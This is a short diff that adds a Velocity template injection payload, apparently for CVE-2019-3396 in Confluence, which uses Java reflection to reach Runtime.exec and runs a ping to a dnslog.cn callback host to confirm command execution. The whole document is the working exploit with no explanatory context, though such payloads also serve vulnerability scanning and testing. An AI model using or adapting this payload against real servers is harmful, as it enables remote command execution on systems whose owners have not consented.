@@ -1,0 +1,2 @@
+#set ($e="exp")
+#set ($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping -c 1 cve-2019-3396.wbz9kmpi.58dnslog.cn"))
